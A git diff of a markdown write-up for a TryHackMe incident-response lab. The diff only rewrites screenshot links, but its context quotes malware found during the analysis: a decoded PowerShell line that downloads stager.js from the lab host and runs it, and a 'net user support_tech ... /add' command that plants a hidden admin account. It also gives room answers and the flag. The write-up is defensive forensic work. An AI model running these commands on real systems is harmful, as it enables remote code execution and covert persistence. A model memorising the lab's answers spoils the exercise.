@@ -70,7 +70,7 @@ THM{H3y_S0_1s_iT_S4f3_T0_SaY_Th3_InterVi3w_W3nT_W3ll?!}
 
 I opened the room page and read the scenario before deploying anything. Room progress was at 12% at this point.
 
-![Room landing page](screenshots/Screenshot%202026-11-23%20184348.jpg)
+![Room landing page](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-23%20184348.jpg)
 
 #### Step 0.2 Mapping the target IP to a hostname via the hosts file
 
@@ -88,13 +88,13 @@ Redirection : the.interview.thm
 Description : The Interview Room On TryHackMe
 ```
 
-![new_host mapping 10.82.154.29 to the.interview.thm](screenshots/Screenshot%202026-11-23%20184519.jpg)
+![new_host mapping 10.82.154.29 to the.interview.thm](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-23%20184519.jpg)
 
 #### Step 0.3 Deploying the Windows analysis VM
 
 I started the in-browser VM (`The-Interview-v0.2`, Windows 10). The desktop contained the two items the room describes: the `the-interview` folder (holding `capture.E01`) and the `tools` folder.
 
-![Windows 10 analysis VM desktop](screenshots/Screenshot%202026-11-23%20184710.jpg)
+![Windows 10 analysis VM desktop](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-23%20184710.jpg)
 
 #### Step 0.4 Setting a password on the Administrator account to enable RDP
 
@@ -110,7 +110,7 @@ net user Administrator *
 
 The `*` makes Windows prompt for the password interactively, so it never appears in the command line or history. (The password itself is intentionally not reproduced here.) Local accounts on the lab VM were `Administrator`, `DefaultAccount`, `Guest` and `WDAGUtilityAccount`.
 
-![net user and net user Administrator *](screenshots/Screenshot%202026-11-23%20185437.jpg)
+![net user and net user Administrator *](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-23%20185437.jpg)
 
 #### Step 0.5 Connecting over RDP
 
@@ -120,11 +120,11 @@ With the password set, I opened the Remote Desktop client against the hosts-file
 the.interview.thm:3389
 ```
 
-![RDP credential prompt](screenshots/Screenshot%202026-11-23%20185511.jpg)
+![RDP credential prompt](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-23%20185511.jpg)
 
 The session connected and the same desktop, including my previous Command Prompt window, appeared inside the RDP window.
 
-![RDP session established](screenshots/Screenshot%202026-11-23%20185552.jpg)
+![RDP session established](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-23%20185552.jpg)
 
 #### Step 0.6 The lab instance expired: updating the IP
 
@@ -140,7 +140,7 @@ Source IP    : 10.82.154.29
 Enter New IP : 10.82.172.225
 ```
 
-![edit_host changing the IP to 10.82.172.225](screenshots/Screenshot%202026-11-25%20153327.jpg)
+![edit_host changing the IP to 10.82.172.225](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20153327.jpg)
 
 ---
 
@@ -150,7 +150,7 @@ Enter New IP : 10.82.172.225
 
 Inside the RDP session I opened `tools\ftk` and launched the **Exterro FTK Imager** shortcut.
 
-![tools\ftk folder](screenshots/Screenshot%202026-11-25%20154900.jpg)
+![tools\ftk folder](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20154900.jpg)
 
 #### Step 1.2 Mounting `capture.E01` read-only
 
@@ -169,19 +169,19 @@ C:\Users\Administrator\Desktop\the-interview\capture.E01
 
 Mounting read-only guarantees I cannot alter the evidence, which keeps the investigation defensible.
 
-![FTK Imager Mount Image To Drive dialog](screenshots/Screenshot%202026-11-25%20155054.jpg)
+![FTK Imager Mount Image To Drive dialog](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155054.jpg)
 
 #### Step 1.3 First look at the mounted volume
 
 The image appeared as `D:`. The top level looked like a normal Windows installation: `inetpub`, `PerfLogs`, `Program Files`, `Program Files (x86)`, `Users`, `Windows` and `vboxpostinstall` (a VirtualBox artefact, so the original was a VM).
 
-![D: top level](screenshots/Screenshot%202026-11-25%20155359.jpg)
+![D: top level](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155359.jpg)
 
 #### Step 1.4 Revealing hidden items
 
 `ProgramData` was not listed because it is a hidden folder. I enabled **View → Hidden items**, which exposed it. This matters: **Windows Defender's quarantine store lives under `ProgramData`**, and I would need it later.
 
-![Hidden items enabled, ProgramData visible](screenshots/Screenshot%202026-11-25%20155500.jpg)
+![Hidden items enabled, ProgramData visible](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155500.jpg)
 
 ---
 
@@ -195,7 +195,7 @@ Only one real user profile exists, `rpike`. Several folders stood out: `Desktop`
 D:\Users\rpike
 ```
 
-![D:\Users\rpike profile](screenshots/Screenshot%202026-11-25%20155557.jpg)
+![D:\Users\rpike profile](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155557.jpg)
 
 #### Step 2.2 The interview folder on the Desktop
 
@@ -208,7 +208,7 @@ D:\Users\rpike
 D:\Users\rpike\Desktop\Brightline_Interview
 ```
 
-![Brightline_Interview folder](screenshots/Screenshot%202026-11-25%20155746.jpg)
+![Brightline_Interview folder](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155746.jpg)
 
 #### Step 2.3 Reading the email (Q1)
 
@@ -221,7 +221,7 @@ Subject: Next step: technical assessment (Head of Security Awareness)
 Date: Mon, 09 Nov 2026 11:22:00 +0000
 ```
 
-![Assessment_Invite.eml opened in Notepad](screenshots/Screenshot%202026-11-25%20155823.jpg)
+![Assessment_Invite.eml opened in Notepad](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155823.jpg)
 
 **Answer to Q1:**
 
@@ -246,7 +246,7 @@ Randall extracted the archive to `Desktop\development\TechnicalAssessment` (file
 D:\Users\rpike\Desktop\development\TechnicalAssessment
 ```
 
-![TechnicalAssessment project folder](screenshots/Screenshot%202026-11-25%20155923.jpg)
+![TechnicalAssessment project folder](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20155923.jpg)
 
 ---
 
@@ -258,15 +258,15 @@ I do not like doing deep analysis inside a lab VM. I copied the artefacts to my 
 
 I dragged the `development` tree across to the WSL share (`\\wsl.localhost\kali-linux\...\the.interview\files`).
 
-![Copying development to WSL](screenshots/Screenshot%202026-11-25%20160124.jpg)
+![Copying development to WSL](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160124.jpg)
 
 #### Step 3.2 Copying the email folder
 
 Next came `Brightline_Interview`, which now showed beside `development` in my `files` directory.
 
-![development copied](screenshots/Screenshot%202026-11-25%20160422.jpg)
+![development copied](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160422.jpg)
 
-![Brightline_Interview copied](screenshots/Screenshot%202026-11-25%20160452.jpg)
+![Brightline_Interview copied](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160452.jpg)
 
 #### Step 3.3 Confirming the structure
 
@@ -276,7 +276,7 @@ tree
 
 The tree confirmed the project layout, which includes a `.csproj`, a `.sln`, `App.config`, `ReportParser.cs` and `Properties\AssemblyInfo.cs`, plus build output directories.
 
-![tree of the files directory](screenshots/Screenshot%202026-11-25%20160514.jpg)
+![tree of the files directory](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160514.jpg)
 
 ---
 
@@ -292,7 +292,7 @@ nvim TechnicalAssessment.csproj
 
 The first 27 lines are standard MSBuild boilerplate (framework v4.8, Debug/Release property groups).
 
-![csproj opened in Neovim](screenshots/Screenshot%202026-11-25%20160535.jpg)
+![csproj opened in Neovim](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160535.jpg)
 
 #### Step 4.2 The `Exec` target (Q2)
 
@@ -306,7 +306,7 @@ At the end of the file, after the `Microsoft.CSharp.targets` import, sits a targ
 
 This is the line that executes the instant the solution is built. Note it is **not** in `ReportParser.cs`, which contains only a decoy login demo.
 
-![The Exec command in TechnicalAssessment.csproj](screenshots/Screenshot%202026-11-25%20160651.jpg)
+![The Exec command in TechnicalAssessment.csproj](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160651.jpg)
 
 **Answer to Q2:**
 
@@ -320,7 +320,7 @@ TechnicalAssessment.csproj
 
 `powershell -enc` expects **Base64 of a UTF‑16LE string**. In CyberChef I pasted the blob (428 characters) into the input pane.
 
-![Encoded blob pasted into CyberChef](screenshots/Screenshot%202026-11-25%20160700.jpg)
+![Encoded blob pasted into CyberChef](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160700.jpg)
 
 I then applied the recipe `From Base64` followed by `Remove null bytes` (the nulls are the high bytes of the UTF‑16LE characters).
 
@@ -335,7 +335,7 @@ The output was a single, readable 160‑character command:
 $dir = $env:TEMP; $file = Join-Path $dir "stager.js"; Invoke-WebRequest -Uri "http://brightlinesec-careers.thm/stager.js" -OutFile $file; cscript //nologo $file
 ```
 
-![CyberChef recipe and decoded output](screenshots/Screenshot%202026-11-25%20160751.jpg)
+![CyberChef recipe and decoded output](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160751.jpg)
 
 What it does: it downloads `stager.js` into `%TEMP%` and runs it silently with the Windows Script Host (`cscript //nologo`). That is stage one.
 
@@ -347,11 +347,11 @@ I saved the CyberChef permalink so the analysis is reproducible and can be re-op
 base64.decode.cyberchef.link
 ```
 
-![CyberChef link saved to decryption/](screenshots/Screenshot%202026-11-25%20160830.jpg)
+![CyberChef link saved to decryption/](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160830.jpg)
 
 I also pasted the decoded command into Notepad as a scratch record.
 
-![Decoded command in Notepad](screenshots/Screenshot%202026-11-25%20160851.jpg)
+![Decoded command in Notepad](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20160851.jpg)
 
 ---
 
@@ -367,13 +367,13 @@ D:\Users\rpike\AppData\Local\Temp
 
 `stager.js` was present: **595 bytes, last modified 11/16/2026 at 8:04 PM**, which matches the build time exactly. That also confirms the build step ran on the victim machine. A `TFR8754.tmp` file written a minute later (8:05 PM) sits alongside it.
 
-![stager.js in the victim's Temp directory](screenshots/Screenshot%202026-11-25%20161137.jpg)
+![stager.js in the victim's Temp directory](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20161137.jpg)
 
 #### Step 5.2 Exporting it
 
 I copied `stager.js` (595 bytes) across to my WSL `files` directory.
 
-![stager.js copied to WSL](screenshots/Screenshot%202026-11-25%20161201.jpg)
+![stager.js copied to WSL](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20161201.jpg)
 
 #### Step 5.3 Reading the stager (Q3)
 
@@ -385,9 +385,9 @@ nvim stager.js
 
 The script is short. It creates `WScript.Shell` and `Scripting.FileSystemObject` ActiveX objects, resolves `%TEMP%`, and sets the target path to `%TEMP%\Ms1.exe`:
 
-![stager.js in Neovim](screenshots/Screenshot%202026-11-25%20161217.jpg)
+![stager.js in Neovim](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20161217.jpg)
 
-![Ms1.exe path selected in stager.js](screenshots/Screenshot%202026-11-25%20161235.jpg)
+![Ms1.exe path selected in stager.js](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20161235.jpg)
 
 The download itself is another PowerShell invocation. The full logic is:
 
@@ -418,7 +418,7 @@ The payload was written to `%TEMP%\Ms1.exe`, but it is no longer there. That is 
 
 I used the open-source `defender-dump` project by Nikola Knežević, which decrypts Defender's quarantine format (an RC4 variant with a hard-coded key from `mpengine.dll`) and extracts the original file.
 
-![knez/defender-dump on GitHub](screenshots/Screenshot%202026-11-25%20161813.jpg)
+![knez/defender-dump on GitHub](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20161813.jpg)
 
 I cloned it into my `decryption` directory and saved the repository link:
 
@@ -430,7 +430,7 @@ gh repo clone knez/defender-dump
 defender-dump.repo.link
 ```
 
-![Cloning defender-dump](screenshots/Screenshot%202026-11-25%20161841.jpg)
+![Cloning defender-dump](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20161841.jpg)
 
 #### Step 6.2 Copying the quarantine store from the image
 
@@ -446,7 +446,7 @@ D:\ProgramData\Microsoft\Windows Defender\Quarantine
 
 I copied the whole `Quarantine` folder to my `files` directory.
 
-![Quarantine folder contents being copied](screenshots/Screenshot%202026-11-25%20162017.jpg)
+![Quarantine folder contents being copied](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20162017.jpg)
 
 #### Step 6.3 Adapting the script (my modification)
 
@@ -468,7 +468,7 @@ The change, in diff form:
 
 Edited in Neovim (insert mode, line 158):
 
-![Tweaking defender-dump.py in Neovim](screenshots/Screenshot%202026-11-25%20162819.jpg)
+![Tweaking defender-dump.py in Neovim](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20162819.jpg)
 
 #### Step 6.4 Running the dump
 
@@ -483,7 +483,7 @@ Exporting Ms1.exe
 File 'quarantine.tar' successfully created
 ```
 
-![defender-dump exporting Ms1.exe](screenshots/Screenshot%202026-11-25%20162908.jpg)
+![defender-dump exporting Ms1.exe](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20162908.jpg)
 
 **Additional verification (listing mode).** To corroborate the story I also ran the script *without* `--dump`, which prints the detection metadata from the quarantine entry. I did this after the capture and it is not in the screenshots:
 
@@ -515,7 +515,7 @@ sha256sum Ms1.exe
 7d2a9987b74bfcd69bf27db91462f3e90ad7fdb281a7ac71eb1554b373d39df0  Ms1.exe
 ```
 
-![Extracting Ms1.exe and computing its SHA-256](screenshots/Screenshot%202026-11-25%20163026.jpg)
+![Extracting Ms1.exe and computing its SHA-256](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20163026.jpg)
 
 The extracted file is 7,680 bytes.
 
@@ -531,7 +531,7 @@ The extracted file is 7,680 bytes.
 
 The payload is a .NET assembly, so a decompiler is the right tool. dnSpy is provided in the lab's `tools` folder. I verified the upstream project first (it is archived, final release v6.1.8, matching the lab's version).
 
-![dnSpy GitHub repository](screenshots/Screenshot%202026-11-25%20163543.jpg)
+![dnSpy GitHub repository](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20163543.jpg)
 
 > **Safety:** I never executed the sample. dnSpy only loads the assembly for static decompilation. I also transferred it into the isolated lab VM rather than analysing it on my host.
 
@@ -548,11 +548,11 @@ zip -rv ms1.zip Ms1.exe
 total bytes=7680, compressed=3572 → 53% savings
 ```
 
-![Zipping Ms1.exe for transfer](screenshots/Screenshot%202026-11-25%20164039.jpg)
+![Zipping Ms1.exe for transfer](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164039.jpg)
 
 I transferred `ms1.zip` through RDP and extracted it to `C:\Users\Administrator\Desktop\ms1\` on the VM.
 
-![ms1.zip on the VM desktop with dnSpy open](screenshots/Screenshot%202026-11-25%20164112.jpg)
+![ms1.zip on the VM desktop with dnSpy open](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164112.jpg)
 
 #### Step 7.2 Loading the assembly in dnSpy
 
@@ -562,17 +562,17 @@ From dnSpy's **File → Open**, I selected the extracted sample.
 C:\Users\Administrator\Desktop\ms1\Ms1.exe
 ```
 
-![dnSpy Open dialog](screenshots/Screenshot%202026-11-25%20164150.jpg)
+![dnSpy Open dialog](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164150.jpg)
 
 The assembly header shows the compile timestamp **`6AFB60E8` → 11/16/2026 8:00:40 PM**, about four minutes before the victim's build (8:04 PM). The entry-point name is a long string of invisible Unicode characters (`\u206A\u202E\u202D...`), a clear sign of **name obfuscation**.
 
-![Ms1 loaded in dnSpy with obfuscated entry point](screenshots/Screenshot%202026-11-25%20164202.jpg)
+![Ms1 loaded in dnSpy with obfuscated entry point](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164202.jpg)
 
 #### Step 7.3 Navigating the obfuscated types
 
 Expanding `Ms1.exe` shows a `ConfusedByAttribute` type. That is the signature the ConfuserEx obfuscator leaves behind. Every class, method and field name is made of zero-width and bidirectional-override characters (U+200B, U+202E, U+206A, ...) so they are unreadable and visually identical. The *logic*, however, decompiles cleanly, and P/Invoke declarations for `VirtualAlloc` and `CreateThread` from `kernel32.dll` are visible. These are common shellcode-loader primitives, although they are declared but not used in the recovered logic.
 
-![Decompiled class with kernel32 imports](screenshots/Screenshot%202026-11-25%20164250.jpg)
+![Decompiled class with kernel32 imports](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164250.jpg)
 
 #### Step 7.4 Persistence/privilege action: the admin account (Q5)
 
@@ -584,7 +584,7 @@ Arguments = "/c net user support_tech Str0ngAnDS3cureP4ssw0rd /add && net localg
 
 The account name `support_tech` is chosen to look like a legitimate IT/helpdesk account so it would blend in on a user list.
 
-![net user ... /add in dnSpy](screenshots/Screenshot%202026-11-25%20164325.jpg)
+![net user ... /add in dnSpy](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164325.jpg)
 
 **Answer to Q5:**
 
@@ -596,7 +596,7 @@ support_tech
 
 Further down is a helper method wrapping .NET's `Aes` class. It sets `KeySize = 256`, uses the supplied key and IV, and calls `CreateEncryptor`, so it is **AES‑256 in CBC mode** (the .NET default mode and padding, PKCS7).
 
-![AES encryption helper in dnSpy](screenshots/Screenshot%202026-11-25%20164420.jpg)
+![AES encryption helper in dnSpy](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164420.jpg)
 
 Two static byte arrays at the bottom of the class hold the **key** and **IV**, built from ASCII strings:
 
@@ -607,7 +607,7 @@ private static readonly byte[] <iv>  = Encoding.UTF8.GetBytes("B3Y73_T0D3C_1V22"
 
 The key is exactly 32 characters (256 bits) and the IV exactly 16 (the AES block size), which confirms the parameters are valid.
 
-![Key highlighted in dnSpy](screenshots/Screenshot%202026-11-25%20164506.jpg)
+![Key highlighted in dnSpy](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164506.jpg)
 
 **Answer to Q6 (encryption key):**
 
@@ -653,7 +653,7 @@ D:\Users\rpike\Documents\BrightlineSecPartners-InternalReportQ4.csv.enc
 
 The `.enc` extension matches the payload's output convention, and the original `.csv` is gone, matching the `File.Delete` call. I copied it to my `files` directory.
 
-![Documents folder showing the .enc file](screenshots/Screenshot%202026-11-25%20164949.jpg)
+![Documents folder showing the .enc file](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20164949.jpg)
 
 To move between my host and the RDP session, I used my `winpath` helper to copy the Windows-style path of the current directory to my clipboard:
 
@@ -665,13 +665,13 @@ winpath
 Windows Path Copied.
 ```
 
-![winpath copying the Windows path](screenshots/Screenshot%202026-11-25%20165019.jpg)
+![winpath copying the Windows path](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165019.jpg)
 
 #### Step 8.2 Loading the file into CyberChef
 
 In CyberChef I used **Open file as input** and selected the encrypted report from my `files` folder.
 
-![Opening the .enc file in CyberChef](screenshots/Screenshot%202026-11-25%20165034.jpg)
+![Opening the .enc file in CyberChef](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165034.jpg)
 
 #### Step 8.3 First attempt fails (input format mismatch)
 
@@ -687,7 +687,7 @@ I configured **AES Decrypt** with the recovered parameters:
 
 CyberChef returned `Unable to decrypt input with these parameters.`
 
-![AES Decrypt failing with Input set to Hex](screenshots/Screenshot%202026-11-25%20165043.jpg)
+![AES Decrypt failing with Input set to Hex](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165043.jpg)
 
 This was not a wrong key. The ciphertext is **raw binary**, not a hex string, and I had left the operation's **Input** dropdown on `Hex`. Hex-decoding binary data yields the wrong bytes, so the ciphertext is no longer a valid multiple of the AES block size and decryption fails.
 
@@ -709,7 +709,7 @@ RPT-2026-003,Priya Nair,CONFIDENTIAL,INTERNAL-CA,Certificate misconfiguration al
 RPT-2026-004,James Holloway,TOP-SECRET,AURORA-PROD-01,Insider threat indicator - anomalous data access,N/A,ESCALATED,54484d7b4833795f53305f31735f69545f533466335f54305f5361595f5468335f496e746572566933775f57336e545f57336c6c3f217d
 ```
 
-![Decrypted report in CyberChef](screenshots/Screenshot%202026-11-25%20165133.jpg)
+![Decrypted report in CyberChef](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165133.jpg)
 
 I independently re-verified the decryption outside CyberChef with OpenSSL (not in the screenshots), and the output was byte-identical:
 
@@ -730,7 +730,7 @@ The `Access_Token` value is hex. I decoded it with CyberChef's `From Hex` (delim
 54484d7b4833795f53305f31735f69545f533466335f54305f5361595f5468335f496e746572566933775f57336e545f57336c6c3f217d
 ```
 
-![From Hex revealing the flag](screenshots/Screenshot%202026-11-25%20165329.jpg)
+![From Hex revealing the flag](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165329.jpg)
 
 **Answer to Q7 (flag):**
 
@@ -752,11 +752,11 @@ flag.hex.decode.cyberchef.link
 encryption.decode.cyberchef.link
 ```
 
-![Saved CyberChef links](screenshots/Screenshot%202026-11-25%20165428.jpg)
+![Saved CyberChef links](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165428.jpg)
 
 I submitted all answers and the room reported completion.
 
-![Room completed](screenshots/Screenshot%202026-11-25%20165346.jpg)
+![Room completed](https://raw.githubusercontent.com/hatixntsoa/tryhackme/master/incident.response/the.interview/screenshots/Screenshot%202026-11-25%20165346.jpg)
 
 ---
 
